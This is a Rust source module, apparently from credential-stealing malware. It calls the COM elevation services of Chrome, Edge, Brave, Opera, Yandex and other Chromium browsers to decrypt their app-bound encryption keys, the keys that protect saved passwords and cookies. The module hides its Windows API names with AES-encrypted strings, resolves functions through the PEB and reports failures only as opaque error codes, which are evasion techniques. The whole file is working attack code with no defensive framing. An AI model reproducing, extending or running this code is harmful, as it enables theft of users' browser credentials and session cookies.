
#![allow(non_snake_case, non_camel_case_types, dead_code, unused)]

use std::ffi::c_void;
use crate::xor::{aes_str, aes_dec,
    CHROME_CLSID_ENV_KEY, CHROME_CLSID_ENV_NONCE, CHROME_CLSID_ENV_CT,
    API_LOAD_LIBRARY_KEY, API_LOAD_LIBRARY_NONCE, API_LOAD_LIBRARY_CT,
    API_GET_PROC_KEY, API_GET_PROC_NONCE, API_GET_PROC_CT,
    DLL_KERNEL32_KEY, DLL_KERNEL32_NONCE, DLL_KERNEL32_CT,
    DLL_OLE32_KEY, DLL_OLE32_NONCE, DLL_OLE32_CT,
    DLL_OLEAUT32_KEY, DLL_OLEAUT32_NONCE, DLL_OLEAUT32_CT,
    API_CO_INIT_KEY, API_CO_INIT_NONCE, API_CO_INIT_CT,
    API_CO_UNINIT_KEY, API_CO_UNINIT_NONCE, API_CO_UNINIT_CT,
    API_CO_CREATE_KEY, API_CO_CREATE_NONCE, API_CO_CREATE_CT,
    API_CO_PROXY_KEY, API_CO_PROXY_NONCE, API_CO_PROXY_CT,
    API_SYS_ALLOC_KEY, API_SYS_ALLOC_NONCE, API_SYS_ALLOC_CT,
    API_SYS_FREE_KEY, API_SYS_FREE_NONCE, API_SYS_FREE_CT,
    API_SYS_LEN_KEY, API_SYS_LEN_NONCE, API_SYS_LEN_CT,
    EXE_EDGE_KEY, EXE_EDGE_NONCE, EXE_EDGE_CT,
    EXE_BRAVE_KEY, EXE_BRAVE_NONCE, EXE_BRAVE_CT,
    EXE_CHROME_KEY, EXE_CHROME_NONCE, EXE_CHROME_CT,
    CHROME_SXS_KEY, CHROME_SXS_NONCE, CHROME_SXS_CT,
    CHROME_SXS_PATH_KEY, CHROME_SXS_PATH_NONCE, CHROME_SXS_PATH_CT,
    CHROME_DEV_KEY, CHROME_DEV_NONCE, CHROME_DEV_CT,
    CHROME_BETA_KEY, CHROME_BETA_NONCE, CHROME_BETA_CT,
};

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct GUID {
    pub data1: u32,
    pub data2: u16,
    pub data3: u16,
    pub data4: [u8; 8],
}

pub const fn guid(d1: u32, d2: u16, d3: u16, d4: [u8; 8]) -> GUID {
    GUID { data1: d1, data2: d2, data3: d3, data4: d4 }
}

const IID_ELEVATOR: GUID            = guid(0xA949CB4E, 0xC4F9, 0x44C4, [0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C]);

const IID_ELEVATOR_CHROME: GUID     = guid(0x463ABECF, 0x410D, 0x407F, [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8]);
const IID_ELEVATOR2_CHROME: GUID    = guid(0x1BF5208B, 0x295F, 0x4992, [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38]);

const IID_ELEVATOR_CHROME_BETA: GUID  = guid(0xA2721D66, 0x376E, 0x4D2F, [0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F]);
const IID_ELEVATOR2_CHROME_BETA: GUID = guid(0xB96A14B8, 0xD0B0, 0x44D8, [0xBA, 0x68, 0x23, 0x85, 0xB2, 0xA0, 0x32, 0x54]);

const IID_ELEVATOR_CHROME_DEV: GUID  = guid(0xBB2AA26B, 0x343A, 0x4072, [0x8B, 0x6F, 0x80, 0x55, 0x7B, 0x8C, 0xE5, 0x71]);
const IID_ELEVATOR2_CHROME_DEV: GUID = guid(0x3FEFA48E, 0xC8BF, 0x461F, [0xAE, 0xD6, 0x63, 0xF6, 0x58, 0xCC, 0x85, 0x0A]);

const IID_ELEVATOR_CHROME_CANARY: GUID  = guid(0x4F7CE041, 0x28E9, 0x484F, [0x9D, 0xD0, 0x61, 0xA8, 0xCA, 0xCE, 0xFE, 0xE4]);
const IID_ELEVATOR2_CHROME_CANARY: GUID = guid(0xFF672E9F, 0x0994, 0x4322, [0x81, 0xE5, 0x3A, 0x5A, 0x97, 0x46, 0x14, 0x0A]);

const IID_ELEVATOR_BRAVE: GUID      = guid(0xF396861E, 0x0C8E, 0x4C71, [0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0x9E]);

const IID_ELEVATOR_EDGE: GUID       = guid(0xC9C2B807, 0x7731, 0x4F34, [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B]);
const IID_ELEVATOR2_EDGE: GUID      = guid(0x8F7B6792, 0x784D, 0x4047, [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05]);

const CLSID_CHROME: GUID            = guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]);
const CLSID_CHROME_BETA: GUID       = guid(0xDD2646BA, 0x3707, 0x4BF8, [0xB9, 0xA7, 0x03, 0x86, 0x91, 0xA6, 0x8F, 0xC2]);
const CLSID_CHROME_DEV: GUID        = guid(0xDA7FDCA5, 0x2CAA, 0x4637, [0xAA, 0x17, 0x07, 0x40, 0x58, 0x4D, 0xE7, 0xDA]);
const CLSID_CHROME_CANARY: GUID     = guid(0x704C2872, 0x2049, 0x435E, [0xA4, 0x69, 0x0A, 0x53, 0x43, 0x13, 0xC4, 0x2B]);
const CLSID_BRAVE: GUID             = guid(0x576B31AF, 0x6369, 0x4B6B, [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B]);
const CLSID_EDGE: GUID              = guid(0x1FCBE96C, 0x1697, 0x43AF, [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67]);
const CLSID_CHROMIUM: GUID          = guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]);

pub struct BrowserCom {
    pub name: &'static str,
    pub clsid: GUID,
    pub iid: GUID,
    pub iid_v2: Option<GUID>,
    pub user_data_rel: &'static str,
    pub service_name: &'static str,
    pub is_edge: bool,
}

pub static BROWSERS: &[BrowserCom] = &[
    BrowserCom {
        name: "Chrome",
        clsid: CLSID_CHROME,
        iid: IID_ELEVATOR_CHROME,
        iid_v2: Some(IID_ELEVATOR2_CHROME),
        user_data_rel: r"Google\Chrome\User Data",
        service_name: "GoogleChromeElevationService",
        is_edge: false,
    },
    BrowserCom {
        name: "Chrome Beta",
        clsid: CLSID_CHROME_BETA,
        iid: IID_ELEVATOR_CHROME_BETA,
        iid_v2: Some(IID_ELEVATOR2_CHROME_BETA),
        user_data_rel: r"Google\Chrome Beta\User Data",
        service_name: "GoogleChromeBetaElevationService",
        is_edge: false,
    },
    BrowserCom {
        name: "Chrome Dev",
        clsid: CLSID_CHROME_DEV,
        iid: IID_ELEVATOR_CHROME_DEV,
        iid_v2: Some(IID_ELEVATOR2_CHROME_DEV),
        user_data_rel: r"Google\Chrome Dev\User Data",
        service_name: "GoogleChromeDevElevationService",
        is_edge: false,
    },
    BrowserCom {
        name: "Chrome Canary",
        clsid: CLSID_CHROME_CANARY,
        iid: IID_ELEVATOR_CHROME_CANARY,
        iid_v2: Some(IID_ELEVATOR2_CHROME_CANARY),
        user_data_rel: r"Google\Chrome SxS\User Data",
        service_name: "GoogleChromeCanaryElevationService",
        is_edge: false,
    },
    BrowserCom {
        name: "Brave",
        clsid: CLSID_BRAVE,
        iid: IID_ELEVATOR_BRAVE,
        iid_v2: Some(IID_ELEVATOR2_CHROME),
        user_data_rel: r"BraveSoftware\Brave-Browser\User Data",
        service_name: "BraveElevationService",
        is_edge: false,
    },
    BrowserCom {
        name: "Edge",
        clsid: CLSID_EDGE,
        iid: IID_ELEVATOR_EDGE,
        iid_v2: Some(IID_ELEVATOR2_EDGE),
        user_data_rel: r"Microsoft\Edge\User Data",
        service_name: "MicrosoftEdgeElevationService",
        is_edge: true,
    },
    BrowserCom {
        name: "Chromium",
        clsid: CLSID_CHROMIUM,
        iid: IID_ELEVATOR,
        iid_v2: Some(IID_ELEVATOR2_CHROME),
        user_data_rel: r"Chromium\User Data",
        service_name: "ChromiumElevationService",
        is_edge: false,
    },
    BrowserCom {
        name: "Vivaldi",
        clsid: CLSID_CHROMIUM,
        iid: IID_ELEVATOR,
        iid_v2: Some(IID_ELEVATOR2_CHROME),
        user_data_rel: r"Vivaldi\User Data",
        service_name: "VivaldiElevationService",
        is_edge: false,
    },
    BrowserCom {
        name: "Opera",
        clsid: CLSID_CHROMIUM,
        iid: IID_ELEVATOR,
        iid_v2: Some(IID_ELEVATOR2_CHROME),
        user_data_rel: r"Opera Software\Opera Stable",
        service_name: "OperaElevationService",
        is_edge: false,
    },
    BrowserCom {
        name: "Yandex",
        clsid: CLSID_CHROMIUM,
        iid: IID_ELEVATOR,
        iid_v2: Some(IID_ELEVATOR2_CHROME),
        user_data_rel: r"Yandex\YandexBrowser\User Data",
        service_name: "YandexBrowserElevationService",
        is_edge: false,
    },
];

pub fn all_browsers() -> &'static [BrowserCom] {
    BROWSERS
}

pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
    let exe = exe_path.to_lowercase();
    let fname = std::path::Path::new(&exe)
        .file_name()
        .and_then(|f| f.to_str())
        .map(|s| s.to_lowercase())
        .unwrap_or_default();

    let s_edge   = aes_str(EXE_EDGE_CT,   &EXE_EDGE_KEY,   &EXE_EDGE_NONCE);
    let s_brave  = aes_str(EXE_BRAVE_CT,  &EXE_BRAVE_KEY,  &EXE_BRAVE_NONCE);
    let s_chrome = aes_str(EXE_CHROME_CT, &EXE_CHROME_KEY, &EXE_CHROME_NONCE);
    let s_sxs    = aes_str(CHROME_SXS_CT,      &CHROME_SXS_KEY,      &CHROME_SXS_NONCE);
    let s_sxsp   = aes_str(CHROME_SXS_PATH_CT, &CHROME_SXS_PATH_KEY, &CHROME_SXS_PATH_NONCE);
    let s_dev    = aes_str(CHROME_DEV_CT,  &CHROME_DEV_KEY,  &CHROME_DEV_NONCE);
    let s_beta   = aes_str(CHROME_BETA_CT, &CHROME_BETA_KEY, &CHROME_BETA_NONCE);

    if fname == s_edge {
        return BROWSERS.iter().find(|b| b.name == "Edge");
    }
    if fname == s_brave {
        return BROWSERS.iter().find(|b| b.name == "Brave");
    }
    if fname == s_chrome {
        if exe.contains(&s_sxs) || exe.contains(&s_sxsp) {
            return BROWSERS.iter().find(|b| b.name == "Chrome Canary");
        }
        if exe.contains(&s_dev) {
            return BROWSERS.iter().find(|b| b.name == "Chrome Dev");
        }
        if exe.contains(&s_beta) {
            return BROWSERS.iter().find(|b| b.name == "Chrome Beta");
        }
        if exe.contains("chromium") && !exe.contains("google") {
            return BROWSERS.iter().find(|b| b.name == "Chromium");
        }
        return BROWSERS.iter().find(|b| b.name == "Chrome");
    }
    if fname == "vivaldi.exe" {
        return BROWSERS.iter().find(|b| b.name == "Vivaldi");
    }
    if fname == "opera.exe" {
        return BROWSERS.iter().find(|b| b.name == "Opera");
    }
    if fname == "browser.exe" {
        if exe.contains("yandex") {
            return BROWSERS.iter().find(|b| b.name == "Yandex");
        }
        if exe.contains("coccoc") {
            return BROWSERS.iter().find(|b| b.name == "Chromium");
        }
        return BROWSERS.iter().find(|b| b.name == "Chromium");
    }
    if fname == "arc.exe" {
        return BROWSERS.iter().find(|b| b.name == "Chromium");
    }
    if fname == "epic.exe" || fname == "centbrowser.exe" || fname == "iridium.exe"
        || fname == "thorium.exe" || fname == "slimjet.exe" || fname == "torch.exe" {
        return BROWSERS.iter().find(|b| b.name == "Chromium");
    }
    None
}

fn parse_guid(s: &str) -> Option<GUID> {
    let s = s.trim().trim_start_matches('{').trim_end_matches('}');
    let parts: Vec<&str> = s.split('-').collect();
    if parts.len() != 5 { return None; }
    let d1 = u32::from_str_radix(parts[0], 16).ok()?;
    let d2 = u16::from_str_radix(parts[1], 16).ok()?;
    let d3 = u16::from_str_radix(parts[2], 16).ok()?;
    let mut d4 = [0u8; 8];
    let p3 = parts[3].as_bytes();
    let p4 = parts[4].as_bytes();
    if p3.len() != 4 || p4.len() != 12 { return None; }
    d4[0] = u8::from_str_radix(std::str::from_utf8(&p3[0..2]).ok()?, 16).ok()?;
    d4[1] = u8::from_str_radix(std::str::from_utf8(&p3[2..4]).ok()?, 16).ok()?;
    for i in 0..6 {
        d4[2+i] = u8::from_str_radix(std::str::from_utf8(&p4[2*i..2*i+2]).ok()?, 16).ok()?;
    }
    Some(GUID { data1: d1, data2: d2, data3: d3, data4: d4 })
}

fn guid_to_string(g: &GUID) -> String {
    format!(
        "{{{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}}}",
        g.data1, g.data2, g.data3,
        g.data4[0], g.data4[1], g.data4[2], g.data4[3],
        g.data4[4], g.data4[5], g.data4[6], g.data4[7],
    )
}

type FnCoInitializeEx = unsafe extern "system" fn(*const c_void, u32) -> i32;
type FnCoUninitialize = unsafe extern "system" fn();
type FnCoCreateInstance = unsafe extern "system" fn(*const GUID, *const c_void, u32, *const GUID, *mut *mut c_void) -> i32;
type FnCoSetProxyBlanket = unsafe extern "system" fn(*mut c_void, u32, u32, *const u16, u32, u32, *const c_void, u32) -> i32;
type FnSysAllocStringByteLen = unsafe extern "system" fn(*const i8, u32) -> *mut u16;
type FnSysFreeString = unsafe extern "system" fn(*mut u16);
type FnSysStringByteLen = unsafe extern "system" fn(*const u16) -> u32;

struct ComApis {
    co_init: FnCoInitializeEx,
    co_uninit: FnCoUninitialize,
    co_create: FnCoCreateInstance,
    co_proxy: FnCoSetProxyBlanket,
    sys_alloc: FnSysAllocStringByteLen,
    sys_free: FnSysFreeString,
    sys_len: FnSysStringByteLen,
}

static mut COM_APIS: Option<ComApis> = None;

type FnLoadLibraryA = unsafe extern "system" fn(*const i8) -> *mut u8;

unsafe fn force_load(name: &str) -> Option<*mut u8> {
    if let Some(base) = crate::peb::get_module_base(name) {
        return Some(base);
    }
    let k32_s = aes_str(DLL_KERNEL32_CT, &DLL_KERNEL32_KEY, &DLL_KERNEL32_NONCE);
    let k32 = if !crate::G_K32_BASE.is_null() {
        crate::G_K32_BASE
    } else {
        crate::peb::get_module_base(&k32_s)?
    };
    let ll_s = aes_str(API_LOAD_LIBRARY_CT, &API_LOAD_LIBRARY_KEY, &API_LOAD_LIBRARY_NONCE);
    let load_library: FnLoadLibraryA = std::mem::transmute(
        crate::peb::resolve_export(k32, &ll_s)?
    );
    let c_name = std::ffi::CString::new(name).ok()?;
    let base = load_library(c_name.as_ptr());
    if base.is_null() { None } else { Some(base) }
}

unsafe fn init_com_apis() -> Option<&'static ComApis> {
    if COM_APIS.is_some() { return COM_APIS.as_ref(); }

    let k32_s2 = aes_str(DLL_KERNEL32_CT, &DLL_KERNEL32_KEY, &DLL_KERNEL32_NONCE);
    let k32 = if !crate::G_K32_BASE.is_null() {
        crate::G_K32_BASE
    } else {
        crate::peb::get_module_base(&k32_s2)?
    };
    let ll_s2 = aes_str(API_LOAD_LIBRARY_CT, &API_LOAD_LIBRARY_KEY, &API_LOAD_LIBRARY_NONCE);
    let gp_s  = aes_str(API_GET_PROC_CT, &API_GET_PROC_KEY, &API_GET_PROC_NONCE);
    let load_library_fn: FnLoadLibraryA = std::mem::transmute(crate::peb::resolve_export(k32, &ll_s2)?);
    let get_proc: unsafe extern "system" fn(*mut u8, *const i8) -> *mut u8 = std::mem::transmute(
        crate::peb::resolve_export(k32, &gp_s)?
    );

    let ole32_s   = aes_dec(DLL_OLE32_CT,    &DLL_OLE32_KEY,    &DLL_OLE32_NONCE);
    let oleaut_s  = aes_dec(DLL_OLEAUT32_CT, &DLL_OLEAUT32_KEY, &DLL_OLEAUT32_NONCE);
    let ci_s      = aes_dec(API_CO_INIT_CT,   &API_CO_INIT_KEY,   &API_CO_INIT_NONCE);
    let cu_s      = aes_dec(API_CO_UNINIT_CT, &API_CO_UNINIT_KEY, &API_CO_UNINIT_NONCE);
    let cc_s      = aes_dec(API_CO_CREATE_CT, &API_CO_CREATE_KEY, &API_CO_CREATE_NONCE);
    let cp_s      = aes_dec(API_CO_PROXY_CT,  &API_CO_PROXY_KEY,  &API_CO_PROXY_NONCE);
    let sa_s      = aes_dec(API_SYS_ALLOC_CT, &API_SYS_ALLOC_KEY, &API_SYS_ALLOC_NONCE);
    let sf_s      = aes_dec(API_SYS_FREE_CT,  &API_SYS_FREE_KEY,  &API_SYS_FREE_NONCE);
    let sl_s      = aes_dec(API_SYS_LEN_CT,   &API_SYS_LEN_KEY,   &API_SYS_LEN_NONCE);
    let ole32_name   = std::ffi::CString::new(ole32_s).ok()?;
    let ole32 = load_library_fn(ole32_name.as_ptr());
    if ole32.is_null() { return None; }
    let oleaut_name  = std::ffi::CString::new(oleaut_s).ok()?;
    let oleaut = load_library_fn(oleaut_name.as_ptr());
    if oleaut.is_null() { return None; }

    let ci_name = std::ffi::CString::new(ci_s).ok()?;
    let cu_name = std::ffi::CString::new(cu_s).ok()?;
    let cc_name = std::ffi::CString::new(cc_s).ok()?;
    let cp_name = std::ffi::CString::new(cp_s).ok()?;
    let sa_name = std::ffi::CString::new(sa_s).ok()?;
    let sf_name = std::ffi::CString::new(sf_s).ok()?;
    let sl_name = std::ffi::CString::new(sl_s).ok()?;

    let ci = get_proc(ole32, ci_name.as_ptr());
    let cu = get_proc(ole32, cu_name.as_ptr());
    let cc = get_proc(ole32, cc_name.as_ptr());
    let cp = get_proc(ole32, cp_name.as_ptr());
    let sa = get_proc(oleaut, sa_name.as_ptr());
    let sf = get_proc(oleaut, sf_name.as_ptr());
    let sl = get_proc(oleaut, sl_name.as_ptr());

    if ci.is_null() || cu.is_null() || cc.is_null() || cp.is_null() || sa.is_null() || sf.is_null() || sl.is_null() {
        return None;
    }

    COM_APIS = Some(ComApis {
        co_init: std::mem::transmute(ci),
        co_uninit: std::mem::transmute(cu),
        co_create: std::mem::transmute(cc),
        co_proxy: std::mem::transmute(cp),
        sys_alloc: std::mem::transmute(sa),
        sys_free: std::mem::transmute(sf),
        sys_len: std::mem::transmute(sl),
    });
    COM_APIS.as_ref()
}

type FnDec = unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut u16, *mut u32) -> i32;

const COINIT_MULTITHREADED: u32 = 0x0;
const CLSCTX_LOCAL_SERVER: u32 = 0x4;
const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;

struct OwnedBstr(*mut u16);

impl OwnedBstr {
    unsafe fn from_bytes(data: &[u8]) -> Option<Self> {
        if data.is_empty() { return None; }
        let api = init_com_apis()?;
        let p = (api.sys_alloc)(data.as_ptr() as *const i8, data.len() as u32);
        if p.is_null() { None } else { Some(OwnedBstr(p)) }
    }
    fn ptr(&self) -> *mut u16 { self.0 }
}

impl Drop for OwnedBstr {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe {
                if let Some(api) = init_com_apis() {
                    (api.sys_free)(self.0);
                }
            };
            self.0 = std::ptr::null_mut();
        }
    }
}

unsafe fn consume_bstr(p: *mut u16) -> Vec<u8> {
    if p.is_null() { return Vec::new(); }
    let api = match init_com_apis() {
        Some(a) => a,
        None => return Vec::new(),
    };
    let len = (api.sys_len)(p) as usize;
    let bytes = std::slice::from_raw_parts(p as *const u8, len).to_vec();
    (api.sys_free)(p);
    bytes
}

#[inline(never)]
unsafe fn call_decrypt_at_slot(punk: *mut c_void, enc: &[u8], slot: usize) -> Result<Vec<u8>, String> {
    if punk.is_null() { return Err("e30".into()); }
    let vtbl_ptr = *(punk as *const *const c_void);
    if vtbl_ptr.is_null() { return Err("e31".into()); }
    let dec_fn_ptr = *(vtbl_ptr as *const *const c_void).add(slot);
    if dec_fn_ptr.is_null() { return Err("e32".into()); }
    let dec: FnDec = std::mem::transmute(dec_fn_ptr);

    let cipher = OwnedBstr::from_bytes(enc).ok_or("e33")?;
    let mut plain: *mut u16 = std::ptr::null_mut();
    let mut last_err: u32 = 0;
    let hr_d = dec(punk, cipher.ptr(), &mut plain, &mut last_err);
    if hr_d < 0 {
        return Err("e34".into());
    }
    let bytes = consume_bstr(plain);
    if bytes.is_empty() { return Err("e35".into()); }
    Ok(bytes)
}

fn normalize_com_key(bytes: &[u8]) -> Option<Vec<u8>> {
    if bytes.len() == 32 { return Some(bytes.to_vec()); }
    if bytes.len() > 32 {
        let tail = &bytes[bytes.len() - 32..];
        if tail.iter().any(|&b| b != 0) { return Some(tail.to_vec()); }
    }
    None
}

unsafe fn try_one(clsid: &GUID, iid: &GUID, enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
    let api = init_com_apis().ok_or("e36")?;
    let mut punk: *mut c_void = std::ptr::null_mut();
    let hr = (api.co_create)(clsid, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid, &mut punk);
    if hr < 0 { return Err("e37".into()); }
    if punk.is_null() { return Err("e38".into()); }

    let _ = (api.co_proxy)(
        punk,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        std::ptr::null(),
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        std::ptr::null(),
        EOAC_DYNAMIC_CLOAKING,
    );

    let mut last = String::from("e1");
    for &slot in slots {
        match call_decrypt_at_slot(punk, enc, slot) {
            Ok(bytes) => {
                if let Some(key) = normalize_com_key(&bytes) {
                    let vtbl_ptr = *(punk as *const *const c_void);
                    let rel: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(*(vtbl_ptr as *const *const c_void).add(2));
                    rel(punk);
                    return Ok(key);
                }
                last = "e39".into();
            }
            Err(e) => last = e,
        }
    }

    let vtbl_ptr = *(punk as *const *const c_void);
    let rel: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(*(vtbl_ptr as *const *const c_void).add(2));
    rel(punk);
    Err("e40".into())
}

unsafe fn try_browser(browser: &BrowserCom, enc: &[u8]) -> Result<Vec<u8>, String> {
    let clsid_env_name = aes_str(CHROME_CLSID_ENV_CT, &CHROME_CLSID_ENV_KEY, &CHROME_CLSID_ENV_NONCE);
    let clsid = if let Ok(s) = std::env::var(&clsid_env_name) {
        if let Some(g) = parse_guid(&s) { g } else { browser.clsid }
    } else {
        browser.clsid
    };

    let slots: &[usize] = if browser.is_edge {
        &[8usize, 6, 7, 5]
    } else {
        &[5usize, 6, 7, 8]
    };

    let iids: &[GUID] = if let Some(v2) = browser.iid_v2 {
        &[v2, browser.iid][..]
    } else {
        std::slice::from_ref(&browser.iid)
    };

    let mut last = String::new();
    for iid in iids {
        match try_one(&clsid, iid, enc, slots) {
            Ok(key) => return Ok(key),
            Err(e)  => last = e,
        }
    }

    Err("e41".into())
}

pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let api = init_com_apis().ok_or("e42")?;
        let hr = (api.co_init)(std::ptr::null(), COINIT_MULTITHREADED);
        let hr_u = hr as u32;
        if hr < 0 && hr_u != 0x0000_0001u32 {
            return Err("e43".into());
        }
        let r = try_browser(browser, encrypted_key);
        (api.co_uninit)();
        r
    }
}

pub fn decrypt_app_bound_key(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let api = init_com_apis().ok_or("e44")?;
        let hr = (api.co_init)(std::ptr::null(), COINIT_MULTITHREADED);
        let hr_u = hr as u32;
        if hr < 0 && hr_u != 0x0000_0001u32 {
            return Err("e45".into());
        }
        let mut last = String::from("e1");
        for b in BROWSERS {
            match try_browser(b, encrypted_key) {
                Ok(key) => { (api.co_uninit)(); return Ok(key); }
                Err(e)  => last = e,
            }
        }
        (api.co_uninit)();
        Err("e46".into())
    }
}
